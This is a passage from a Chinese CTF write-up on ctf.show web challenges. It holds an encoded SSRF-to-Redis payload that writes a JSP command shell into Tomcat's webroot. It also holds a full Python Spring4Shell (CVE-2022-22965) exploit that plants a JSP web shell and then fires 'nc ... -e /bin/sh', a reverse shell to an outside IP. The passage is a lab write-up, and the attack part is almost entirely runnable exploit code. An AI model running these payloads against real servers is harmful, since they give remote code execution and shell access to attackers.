/goPage?url=127.0.0.1&port=6379&config%20set%20dir%20%2fusr%2flocal%2ftomcat%2fwebapps%2fROOT%2f%0d%0aconfig%20set%20dbfilename%20f.jsp%0d%0aconfig%20set%20rdbcompression%20no%0d%0aset%20x%20%22%5cn%5cn%3c%25%20if(request.getParameter(%5c%22cmd%5c%22)!%3dnull)%7b%20java.io.InputStream%20in%20%3d%20Runtime.getRuntime().exec(request.getParameter(%5c%22cmd%5c%22)).getInputStream()%3b%20int%20a%20%3d%20-1%3b%20byte%5b%5d%20b%20%3d%20new%20byte%5b2048%5d%3b%20while((a%3din.read(b))!%3d-1)%7b%20out.println(new%20String(b))%3b%20%7d%20%7d%20%25%3e%5cn%5cn%22%0d%0asave%0d%0aquit=
```

## web845

[📎readMe.pdf](https://www.yuque.com/attachments/yuque/0/2025/pdf/52634675/1767175608219-160f0d7b-9969-4857-a428-4c32746400bd.pdf)

看文章就能复现出来，**Spring4Shell (CVE-2022-22965)**，想打那种不带 header 的表达式注入的，但是好像没成功

```python
import httpx
import time
import warnings

warnings.filterwarnings("ignore")

url = "https://55a15450-587d-494f-a977-5093475b57a1.challenge.ctf.show/"
reverse_shell_cmd = "nc 154.36.181.12 12345 -e /bin/sh"

def exploit():
    client = httpx.Client(verify=False, timeout=10.0)
    
    jsp_payload = '<% { String x=request.getParameter(new String(new byte[]{97})); if(x!=null){Runtime.getRuntime().exec(x);} } %>'
    
    headers = {
        "p": jsp_payload,
        "User-Agent": "Mozilla/5.0"
    }

    params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{p}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell_ok", 
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }

    try:
        print(f"[*] Target: {url}")
        
        client.get(url, headers=headers, params=params)
        
        for _ in range(5):
            client.get(url, headers=headers)
            time.sleep(0.5)
        
        shell_url = url + "shell_ok.jsp"
        time.sleep(2)
        
        check = client.get(shell_url)
        if check.status_code == 200:
            print(f"[+] Shell confirmed at: {shell_url}")
            print(f"[*] Executing reverse shell: {reverse_shell_cmd}")
            
            try:
                client.get(shell_url, params={"a": reverse_shell_cmd}, timeout=2.0)
            except httpx.ReadTimeout:
                print("[+] Request timed out (Expected for reverse shell). Check your listener!")
        else:
            print(f"[-] Shell check failed with status: {check.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    exploit()
```

![img](5.png)

运行一次不行再运行一次，靶机可能初始化有点久

## 小结

jwt 和 sql 注入那题比较麻烦，其他题目做起来都挺顺利的（可能是因为这是22年的题目了吧😸
